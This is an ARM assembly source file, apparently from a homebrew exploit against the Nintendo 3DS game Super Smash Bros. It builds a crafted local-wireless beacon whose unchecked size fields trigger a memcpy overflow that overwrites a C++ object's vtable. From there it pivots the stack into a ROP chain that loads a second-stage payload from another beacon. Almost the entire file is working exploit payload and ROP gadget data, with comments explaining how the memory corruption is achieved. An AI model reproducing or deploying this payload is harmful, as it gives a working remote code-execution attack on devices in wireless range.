.arm
.section .init
.global _start

#include "smashbroshax.h"

@ Beacon tag data for OUI-type 0x15, big-endian.

_start:
.byte 0x00, 0x1f, 0x32 @ OUI / first 0x1F-bytes of network-struct+0xC.
.byte 0x15 @ OUI type
.word BEWLANCOMMID
.byte 0x00 @ u8 ID
.byte 0x90, 0x80, 0x00
.byte 0xB3, 0x20, 0x6F, 0x07 @ random u32, networkID
.byte 0x01, 0x04, 0x00, 0x01
.byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
.word 0, 0, 0, 0, 0 @ SHA1 hash
.byte 0xb8 @ Size of the following additional-data.

@ Title-specific additional-data(little-endian):

@ Neither of the below size fields are checked. In memory, the second data-block used with size1 for the memcpy is copied to: adr = buf0adr+size0 + (<value of s8 at additionaldata+0x2> * size1). Therefore, the size and the relative offset for the destination buffer can be controlled.
@ This is used to trigger a memcpy with size 0x1898 with the data @ additionaldata+0x34, which then overwrites a c++ object. See below.

additionaldata_start:
.byte 0xff, 0xff
.byte 0x04 @ s8, index?
.byte 0xff
.byte 0xff, 0xff, 0xff, 0xff
.word 0x4 @ additionaldata+0x8, u32 size0. Normally this is 0x22, however with this haxx value 0x04 is used so that more space is available in the second block.
.word ADDITONALDATA_SIZE1 @ additionaldata+0xc, u32 size1
.word 0xffffffff @ additionaldata+0x10. The data used with size0 for the memcpy begins here. The data used with the memcpy for size1 is located immediately after this block.
.word ADDITIONALDATA_ADR+0x20 @ additionaldata+0x10. Beginning of data which overwrites the c++ object. The ptr here overwrites the vtable ptr, therefore the vtable addr is overwritten with <addr of additionaldata+0x20>. (r0)
.word 0x1FF80040 @ additionaldata+0x18 / object+0x4. (r1)
.word 0xffffffff @ r2
.word TEXT_APPMEM_OFFSET - 0x1000 + 0xD0000000 @ r3
.word 0xffffffff @ r4 (additonaldata+0x24)
.word GXLOWCMD4_DSTADR_PTR @ r5 (address used with the "ldr r1, [r5]" by ROP_LDRR1R5_MOVR0R8_BLXR7, before the GXLOW_CMD4 call)
.word 0xffffffff @ r6
.word POP_LRPC @ r7 (jump-addr used with ROP_LDRR1R5_MOVR0R8_BLXR7 before the GXLOW_CMD4 call)
.word TMPBUF_ADR @ r8 (later moved into r0 before the GXLOW_CMD4 call, via ROP_LDRR1R5_MOVR0R8_BLXR7)
.word 0xffffffff @ r9
.word 0xffffffff @ sl
.word 0xffffffff @ fp
.word ROP_LDRR2R0_SUBR1R2R1_STRR1R0 @ ip
.word (ropstackstart-additionaldata_start) + ADDITIONALDATA_ADR @ sp
.word POP_PC @ lr
.word POP_PC @ pc

.word 0, 0

@ Stack begins here. Once the stack-pivot finishes, sp will be set to here, and "pop {pc}" will be executed.
ropstackstart:
.word POP_R0PC
.word GXLOWCMD4_DSTADR_PTR

.word ROP_LDRR1R1_STRR1R0 @ Copy u32 *0x1FF80040(configmem APPMEMALLOC) to GXLOWCMD4_DSTADR_PTR.

.word ROP_MOVR1R3_BXIP @ r1 = r3, then jump to ROP_LDRR2R0_SUBR1R2R1_STRR1R0.

.word POP_R0R4SLIPPC
.word BEACONDATA_ADR @ r0, outbuf
.word 0x600 @ r1, size
.word 0 @ r2, u8 id
.word LEWLANCOMMID @ r3, wlancommID
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word NWMUDS_RecvBeaconBroadcastData @ Recv a beacon, with outbuf at BEACONDATA_ADR.

.word POP_LRPC
.word (BEACONTAGDATA_OUITYPE80_ADR+4) - 4 @ lr, later moved into sp.

.word MOVSPLR_POPLRPC @ Continue ROP with the ROP-chain from smashbros_beacon_rop_payload.s offset 0x4, loaded with NWMUDS_RecvBeaconBroadcastData(beacon tag OUI type 0x80).

.fill ((_start + 0x34+0xb0) - .), 1, 0xffffffff

.word STACKPIVOT_ADR @ additionaldata+0xb0(vtable+0x90). The application calls vtable funcptr +0x90 from the object overwritten above, after the haxx triggers. This results in control of PC(the data located at r0 is also controlled since that's the data overwritten by the above). This is the one used by the demo.
.word STACKPIVOT_ADR @ additionaldata+0xb4(vtable+0x94). This is the one used by the full-game.

